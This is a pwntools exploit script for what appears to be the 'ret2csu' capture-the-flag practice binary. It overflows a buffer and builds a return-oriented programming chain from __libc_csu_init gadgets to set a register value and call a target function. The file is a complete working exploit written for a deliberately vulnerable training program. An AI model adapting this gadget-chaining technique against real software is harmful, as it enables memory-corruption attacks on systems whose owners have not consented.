#!/usr/bin/env python

from pwn import *

p = process("./ret2csu")

p.recvuntil("> ")

payload = (
    "\x90" * 40 +
    p64(0x40089a) + # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    p64(0x0) + # pop rbx + 0 for the call
    p64(0x1) + # trash pop rbp
    p64(0x600e48) + # pop r12 - # fini
    p64(0x0) + # trash pop r13
    p64(0x0) + # trash pop r14
    p64(0xdeadcafebabebeef) + # pop r15
    p64(0x400880) + # mov rdx,r15 ; mov rsi, r14 ; mov edi, r13d ; call QWORD PTR [r12+rbx*8]
    p64(0x0) + # trash add rsp, 0x8
    p64(0x0) + # trash pop rbx
    p64(0x0) + # trash pop rbp
    p64(0x0) + # trash pop r12 
    p64(0x0) + # trash pop r13
    p64(0x0) + # trash pop r14
    p64(0x0) + # trash pop r15
    p64(0x4007b1)
)

p.sendline(payload)
print(p.recvall())

p.close()
